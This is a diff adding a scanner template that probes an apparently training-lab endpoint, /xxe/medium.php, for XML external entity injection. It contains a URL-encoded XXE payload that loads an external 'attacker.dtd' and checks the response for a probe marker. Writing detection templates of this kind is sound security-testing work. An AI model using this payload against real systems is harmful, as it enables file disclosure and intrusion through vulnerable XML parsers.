@@ -1,0 +1,25 @@
+id: vulnlab-xxe-medium
+
+info:
+  name: VulnLab XXE medium 档（外部 DTD）
+  author: hediwen
+  severity: high
+  tags: vulnlab,xxe
+
+http:
+  - raw:
+      - |
+        POST /xxe/medium.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        xml=%3C%3Fxml%20version%3D%221.0%22%3F%3E%3C%21DOCTYPE%20order%20SYSTEM%20%22attacker.dtd%22%3E%3Corder%3E%3Cid%3E%26xxe%3B%3C%2Fid%3E%3C%2Forder%3E
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: regex
+        part: body
+        regex:
+          - "订单号：<b>[^<]*VULNLAB_XXE_PROBE_MARKER"
+
